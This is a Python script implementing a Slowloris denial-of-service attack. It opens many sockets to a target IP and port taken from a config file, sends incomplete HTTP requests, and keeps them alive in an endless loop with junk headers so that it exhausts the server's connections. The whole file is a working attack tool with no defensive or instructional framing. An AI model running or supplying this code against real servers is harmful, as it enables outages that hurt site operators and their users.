#!/usr/bin/env python3
import random
import socket
import time
from config import Config

config = Config()


def slowLoris():
    def send_line(self, line):
        line = f"{line}\r\n"
        self.send(line.encode("utf-8"))

    def send_header(self, name, value):
        self.send_line(f"{name}: {value}")

    def init_socket(ip: str):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        s.connect((ip, config.ATKPort))

        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

        ua = config.SlowLoris_PARAMETERS["user_agent"]

        s.send_header("User-Agent", ua)
        s.send_header("Accept-language", "en-US,en,q=0.5")
        return s

    def slowloris_iteration():
        print("Sending keep-alive headers...")
        print("Socket count: ", len(list_of_sockets))

        # Try to send a header line to each socket
        for s in list(list_of_sockets):
            try:
                s.send_header("X-a", random.randint(1, 5000))
            except socket.error:
                list_of_sockets.remove(s)

        # Some of the sockets may have been closed due to errors or timeouts.
        # Re-create new sockets to replace them until we reach the desired number.

        diff = config.SlowLoris_PARAMETERS["socket_count"] - len(list_of_sockets)
        if diff <= 0:
            return

        print("Creating %s new sockets..." % diff)
        for _ in range(diff):
            try:
                s = init_socket(config.ATKIPv4)
                if not s:
                    continue
                list_of_sockets.append(s)
            except socket.error as e:
                print("Failed to create new socket: %s" % e)
                break

    def slowloris():
        # sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip = config.ATKIPv4
        # port = config.ATKPort
        socket_count = config.SlowLoris_PARAMETERS["socket_count"]
        sleeptime = config.SlowLoris_PARAMETERS["sleeptime"]
        print("Attacking %s with %s sockets." % (ip, socket_count))

        print("Creating sockets...")
        for _ in range(socket_count):
            try:
                print("Creating socket nr %s" % _)
                s = init_socket(ip)
            except socket.error as e:
                print(e)
                break
            list_of_sockets.append(s)

        while True:
            try:
                slowloris_iteration()
            except (KeyboardInterrupt, SystemExit):
                print("Stopping Slowloris")
                break
            except Exception as e:
                print("Error in Slowloris iteration: %s" % e)
            print("Sleeping for %d seconds" % sleeptime)
            time.sleep(sleeptime)

    list_of_sockets = []

    setattr(socket.socket, "send_line", send_line)
    setattr(socket.socket, "send_header", send_header)

    slowloris()


if __name__ == "__main__":
    slowLoris()
